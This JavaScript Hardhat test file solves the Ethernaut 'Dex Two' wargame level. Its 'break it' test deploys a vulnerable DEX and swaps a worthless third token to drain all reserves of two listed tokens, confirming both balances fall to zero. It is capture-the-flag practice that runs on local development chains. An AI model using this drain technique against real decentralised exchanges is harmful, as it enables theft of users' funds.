const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance
const bytes32 = ethers.utils.formatBytes32String

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_dex Unit Tests", function () {
        let owner, Dex, Token1, Token2, Token3
        beforeEach(async () => {
            ;[owner] = await ethers.getSigners()
            const SwappableTokenContract = await ethers.getContractFactory(
                "SwappableToken"
            )
            const DexContract = await ethers.getContractFactory("DexTwo")
            Dex = await DexContract.deploy()

            Token1 = await SwappableTokenContract.deploy(
                Dex.address,
                "token1",
                "token1",
                110
            )
            Token2 = await SwappableTokenContract.deploy(
                Dex.address,
                "token2",
                "token2",
                110
            )
            Token3 = await SwappableTokenContract.deploy(
                Dex.address,
                "token3",
                "token3",
                400
            )

            await Dex.setTokens(Token1.address, Token2.address)

            // send token to dex
            await Token1.token_approve(owner.address, Dex.address, 100)
            await Token2.token_approve(owner.address, Dex.address, 100)
            await Token3.token_approve(owner.address, Dex.address, 100)

            await Dex.addLiquidity(Token1.address, 100)
            await Dex.addLiquidity(Token2.address, 100)
            await Dex.addLiquidity(Token3.address, 100)
        })

        describe("break it", () => {
            it("default attack", async function () {
                // exchange have balance
                const showBalance = async () => {
                    let dex_token1 = await Dex.balanceOf(
                        Token1.address,
                        Dex.address
                    )
                    let dex_token2 = await Dex.balanceOf(
                        Token2.address,
                        Dex.address
                    )
                    let dex_token3 = await Dex.balanceOf(
                        Token3.address,
                        Dex.address
                    )
                    let user_token1 = await Dex.balanceOf(
                        Token1.address,
                        owner.address
                    )
                    let user_token2 = await Dex.balanceOf(
                        Token2.address,
                        owner.address
                    )
                    let user_token3 = await Dex.balanceOf(
                        Token3.address,
                        owner.address
                    )
                    console.log(
                        `dex: ${dex_token1} ${dex_token2} ${dex_token3}, user: ${user_token1} ${user_token2} ${user_token3}`
                    )
                    console.log(`===========================`)
                }

                await showBalance()

                await Token3.token_approve(owner.address, Dex.address, 100)
                await Dex.swap(Token3.address, Token1.address, 100)
                await showBalance()

                await Token3.token_approve(owner.address, Dex.address, 200)
                await Dex.swap(Token3.address, Token2.address, 200)
                await showBalance()

                expect(
                    await Dex.balanceOf(Token1.address, Dex.address)
                ).to.equal(0)
                expect(
                    await Dex.balanceOf(Token2.address, Dex.address)
                ).to.equal(0)
            })
        })
    })
}
